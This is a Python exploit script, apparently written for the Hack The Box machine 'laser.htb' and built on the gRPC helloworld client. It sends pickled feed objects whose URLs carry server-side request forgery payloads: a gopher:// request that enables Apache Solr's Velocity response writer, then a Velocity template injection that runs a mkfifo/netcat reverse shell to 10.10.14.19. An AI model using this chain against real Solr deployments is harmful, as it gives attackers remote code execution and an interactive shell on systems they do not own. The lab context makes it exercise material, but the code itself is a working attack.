# Copyright 2015 gRPC authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""The Python implementation of the GRPC helloworld.Greeter client."""

from __future__ import print_function
import logging

import grpc
import requests
import base64
import s_pb2
import s_pb2_grpc
import json
import pickle

def make_payload(port,payload,protocol):
    p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+payload+'"}'

    # For storing 
    p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
    p = base64.b64encode(p)
    return p 

def run(t):
    # NOTE(gRPC Python Team): .close() is possible on a channel and should be
    # used in circumstances in which the with statement does not fit the needs
    # of the code.
    with grpc.insecure_channel('laser.htb:9000') as channel:
        stub = s_pb2_grpc.PrintStub(channel)

        d = s_pb2.Content(
                data = t,
                )

        response = stub.Feed(d)

    print(response)
    print("Greeter client received: " + response.feed)


if __name__ == '__main__':
    port = "8983"
    node = "staging"

    ###########################################################################
    # activate port
    ###########################################################################
    '''
    _POST /solr/test/config HTTP/1.1
    Host: localhost:8983
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/json
    Cache: no-cache
    Connection: close
    Content-Length: 218

    {"update-queryresponsewriter": {"startup": "lazy", "name": "velocity", "class": "solr.VelocityResponseWriter", "template.base.dir": "", "solr.resource.loader.enabled": "true", "params.resource.loader.enabled": "true"}}
    '''
    payload = "gopher://localhost:8983/_POST%20/solr/staging/config%20HTTP/1.1%0D%0AHost%3A%20localhost%3A8983%0D%0AConnection%3A%20close%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAcccept%3A%20%2A/%2A%0D%0AContent-Type%3A%20application/json%0D%0AContent-Length%3A%20220%0D%0A%0D%0A%7B%22update-queryresponsewriter%22%3A%20%7B%22name%22%3A%20%22velocity%22%2C%20%22startup%22%3A%20%22lazy%22%2C%20%22params.resource.loader.enabled%22%3A%20%22true%22%2C%20%22template.base.dir%22%3A%20%22%22%2C%20%22solr.resource.loader.enabled%22%3A%20%22true%22%2C%20%22class%22%3A%20%22solr.VelocityResponseWriter%22%7D%7D"
    temp = make_payload(port,payload,"gopher")
    run(temp)

    ###########################################################################
    # rce
    ###########################################################################
    '''
    GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('nc 10.10.14.19 1337')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end HTTP/1.1
    Host: localhost:8983
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/x-www-form-urlencoded
    Cache: no-cache
    Connection: close


    '''

    command = "nc%2010.10.14.19%204444"
    command = "rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.10.14.19%204242%20>/tmp/f"
    url = ("/select?q=1&wt=velocity&v.template=custom&v.template.custom="
        "%23set($x=%27%27)+"
        "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
        "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
        "%23set($str=$x.class.forName(%27java.lang.String%27))+"
        "%23set($ex=$rt.getRuntime().exec(%27" + command +
        "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
        "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")

    payload = "http://localhost:8983/solr/staging" + url
    temp = make_payload(port,payload,"gopher")
    run(temp)
